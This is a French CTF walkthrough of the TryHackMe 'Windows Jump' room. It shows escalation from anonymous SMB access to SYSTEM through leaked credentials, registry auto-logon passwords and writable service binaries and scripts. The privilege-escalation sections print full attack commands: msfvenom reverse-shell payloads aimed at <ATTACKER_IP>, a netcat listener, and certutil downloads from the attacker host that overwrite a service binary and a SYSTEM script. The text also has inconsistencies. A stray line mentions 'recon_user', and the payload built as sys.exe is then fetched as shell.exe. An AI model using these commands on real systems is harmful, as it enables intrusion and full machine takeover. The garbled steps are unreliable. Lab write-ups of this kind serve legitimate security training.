---
title: "TryHackMe - Windows Jump"
platform: "TryHackMe"
difficulty: "Medium"
tags: [windows,ctf,privilege escalation,smb,registry,services,scheduled tasks]
---

## Résumé

L'objectif de cette room est d'exploiter une chaîne d'escalade de privilèges purement Windows pour progresser d'un accès anonyme sur un partage SMB jusqu'au compte SYSTEM, sans passer par une vulnérabilité logicielle classique : identifiants oubliés dans un partage public, credentials d'auto-logon stockés en clair dans le registre, permissions NTFS trop larges sur le binaire d'un service, puis sur un script exécuté en contexte SYSTEM. Chaque palier repose sur une mauvaise configuration typique que l'on retrouve régulièrement en environnement d'entreprise.

## Outils/Technos Utilisés

Reconnaissance : Nmap, smbclient

Accès Initial : xfreerdp

Élévation de privilèges : reg query (registre Winlogon), runas /savecred, sc / icacls, msfvenom, netcat, certutil, schtasks

## Reconnaissance

Un scan Nmap complet révèle une machine Windows Server classique, avec SMB et RDP exposés :

```bash
nmap -sC -sV -p- -T4 10.129.146.157

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

Le NetBIOS name (PRIVESC) et le signing SMB activé mais non requis sont deux indices classiques d'une machine orientée privilege escalation, sans surface web à exploiter : tout va se jouer sur SMB et RDP.

## Exploitation initiale

Aucun port applicatif supplémentaire n'étant ouvert, l'énumération SMB en anonyme est la première piste logique :

```bash
smbclient -L //10.129.146.157/ -N

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share
```

Le partage Public est accessible sans authentification et contient un fichier welcome.txt laissant traîner des identifiants par défaut :

```bash
smbclient //10.129.146.157/Public -N
get welcome.txt
```

```bash
cat welcome.txt
Welcome to CORP-NET.
New employee default credentials
================================
Username : thmuser
Password : Password1!
```

Ces identifiants suffisent pour ouvrir une session RDP complète :

```bash
xfreerdp /u:thmuser /p:'Password1!' /v:10.129.146.157 /cert:ignore
```

whoami /priv et whoami /groups confirment un compte standard sans privilège particulier — le point de départ classique d'une chaîne de privesc.


## Élévation de privilèges

thmuser → notadmin (credentials d'auto-logon dans le registre)

La clé Winlogon du registre stocke parfois des identifiants d'auto-connexion oubliés par un administrateur :
Une énumération basique révèle que recon_user appartient à plusieurs groupes secondaires, en plus du sien :

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

AutoAdminLogon      REG_SZ    1
DefaultUserName     REG_SZ    notadmin
DefaultPassword     REG_SZ    P@ssw0rd!
```

Ces identifiants permettent d'ouvrir un shell sous une nouvelle identité avec runas :

```bash
runas /user:PRIVESC\notadmin cmd
```

notadmin → svcadmin (binaire de service inscriptible)

notadmin reste un compte standard, mais l'énumération des services révèle THMSvc, exécuté sous le compte svcadmin :

```bash
sc qc THMSvc

BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
SERVICE_START_NAME : .\svcadmin
```

Et surtout, les permissions NTFS du binaire sont catastrophiques :

```bash
icacls C:\Windows\THMSVC\svc.exe
C:\Windows\THMSVC\svc.exe Everyone:(F)
```

Everyone a un contrôle total sur l'exécutable du service : il suffit de le remplacer par un reverse shell et de redémarrer le service pour obtenir une exécution de code sous l'identité svcadmin.

```bash
# Sur l'attackbox
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o svc.exe
python3 -m http.server 8000
nc -lvnp 4444
```

```bash
# Sur la cible, depuis le shell notadmin
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/svc.exe C:\Windows\THMSVC\svc.exe
sc stop THMSvc
sc start THMSvc
```

Le listener reçoit la connexion : whoami confirme privesc\svcadmin.

svcadmin → SYSTEM (script exécuté en contexte SYSTEM)

svcadmin appartient toujours à un groupe standard, mais un script cleanup.bat traîne dans C:\Windows\Tasks\, exécuté périodiquement en contexte SYSTEM dans le cadre de la maintenance planifiée de la machine :

```bash
icacls C:\Windows\Tasks\cleanup.bat
C:\Windows\Tasks\cleanup.bat PRIVESC\svcadmin:(I)(M)
NT AUTHORITY\SYSTEM:(I)(F)
```

svcadmin a un droit de modification sur ce script : même principe que pour THMSvc, on l'écrase pour qu'il télécharge et exécute un nouveau reverse shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=5555 -f exe -o sys.exe
```

```bash
# Sur la cible, depuis le shell svcadmin
certutil -urlcache -f http://<ATTACKER_IP>:8000/shell.exe C:\Windows\Tasks\shell.exe
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

Après le prochain déclenchement du script, le listener reçoit une nouvelle connexion :

```bash
whoami
nt authority\system
```

SYSTEM obtenu.

## Conclusion

Cette room illustre bien qu'une machine Windows n'a pas besoin d'un exploit logiciel complexe pour tomber entièrement : une simple chaîne de mauvaises configurations — partage SMB mal protégé, identifiants d'auto-logon en clair dans le registre, permissions NTFS trop larges sur un binaire de service, puis sur un script système — suffit à remonter jusqu'à SYSTEM. Le réflexe le plus utile ici a été de systématiquement vérifier les permissions (icacls) sur tout ce qui s'exécute avec un privilège plus élevé que l'utilisateur courant, plutôt que de chercher directement un exploit. Une bonne mise en pratique de l'énumération méthodique côté Windows, en complément de ce que j'avais surtout pratiqué côté Linux jusqu'ici.

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
